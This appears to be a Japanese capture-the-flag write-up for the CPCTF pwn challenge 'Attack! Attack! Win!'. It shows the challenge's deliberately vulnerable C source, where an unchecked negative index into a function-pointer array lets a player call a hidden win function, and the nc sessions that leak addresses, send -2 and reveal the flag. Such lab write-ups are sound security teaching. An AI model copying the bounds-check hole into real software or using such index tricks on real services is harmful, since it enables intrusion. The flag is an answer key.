# Attack! Attack! Win!:Pwn:10.00pts
flagを盗まれてしまいました……  
敵を倒して取り返してきてもらえませんか？  
`nc attack_attack_win.web.cpctf.space 30005`  

[配布ファイル](attack_attack_win.zip)  

**Hint**  
HocusPocus を選択するとメモリリークが起きます。  
winとAttackの間には24の差があるようです。  
また、AttackとHeal、HealとHocusPocusの間には8の差があります。  
ここから、1大きい数字を入力すると8大きいコマンドが実行されているのではないか？と推測できます。  
つまり、winを実行するためにはAttackよりも3小さい数字、すなわち-2を入れればよいはずです。  
実際に入力してみましょう。  

# Solution
接続先とソースが与えられる。  
ソースは以下の通りであった。  
```c
#include <stdio.h>
#include <stdlib.h>

int enemyHp, playerHp;
void (*win)();
void (*enemyCommand)();
void (*playerCommands[3])();

void init(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	alarm(60);
}

void getFlag(){
	puts("You got the flag!");
	system("cat flag.txt");
}

void hocusPocus(){
	puts("Memory leak!");
	printf("Attack     : %p\n", &playerCommands[0]);
	printf("Heal       : %p\n", &playerCommands[1]);
	printf("HocusPocus : %p\n", &playerCommands[2]);
	printf("win        : %p\n\n", &win);
}

void attack(){
	enemyHp -= 40;
	if(enemyHp < 0){
		enemyHp = 0;
	}
}

void heal(){
	playerHp += 30;
	if(playerHp > 100){
		playerHp = 100;
	}
}

void enemyAttack(){
	playerHp -= 50;
	if(playerHp < 0){
		playerHp = 0;
	}
}

void printHp(){
	printf("YourHP:%d\nenemyHp:%d\n\n", playerHp, enemyHp);
}

void printCommands(){
	puts("1: Attack\n2: Heal\n3: Hocus Pocus\n");
}

int main(){
	int input;

	init();
	enemyHp = 100;
	playerHp = 100;
	playerCommands[0] = attack;
	playerCommands[1] = heal;
	playerCommands[2] = hocusPocus;
	enemyCommand = enemyAttack;
	win = getFlag;

	puts("\n");
	puts("Defeat the enemy to get the flag!\n\n");

	while(1){
		printHp();
		if(playerHp <= 0){
			puts("You lose...");
			break;
		}else if(enemyHp <= 0){
			win();
		}
		printCommands();

		scanf("%d", &input);
		printf("\n");

		if(input > 3){
			puts("Nothing happens.\n");
		}else{
			playerCommands[input - 1]();
		}
		enemyCommand();
	}
	return 0;
}
```
`attack`、`heal`、`hocusPocus`なるコマンドがあり、関数を呼び出す形で実現されている。  
`win`(`getFlag`)が用意されているので、そちらを呼び出せばゴールとなる。  
`attack`、`heal`は決まった動作で、悪用可能ではなさそうだ。  
`hocusPocus`はアドレスを表示してくれる。  
接続してアドレスを見る。  
```bash
$ nc attack_attack_win.web.cpctf.space 30005


Defeat the enemy to get the flag!


YourHP:100
enemyHp:100

1: Attack
2: Heal
3: Hocus Pocus

3

Memory leak!
Attack     : 0x55da79752070
Heal       : 0x55da79752078
HocusPocus : 0x55da79752080
win        : 0x55da79752058
~~~
```
`win`は`attack`の0x18前にいることがわかる。  
ここで、`playerCommands[input - 1]();`の箇所で、`input`にチェックがないため負の数を指定できることに気づく。  
0x18前に`win`がいるので`playerCommands[-3]();`となるよう`-2`を入力してやる。  
```bash
$ nc attack_attack_win.web.cpctf.space 30005


Defeat the enemy to get the flag!


YourHP:100
enemyHp:100

1: Attack
2: Heal
3: Hocus Pocus

-2

You got the flag!
CPCTF{4_c1eVeR_4nd_p4CifI5t_7hi3F}
~~~
```
`win`が呼び出され、flagが得られた。  

## CPCTF{4_c1eVeR_4nd_p4CifI5t_7hi3F}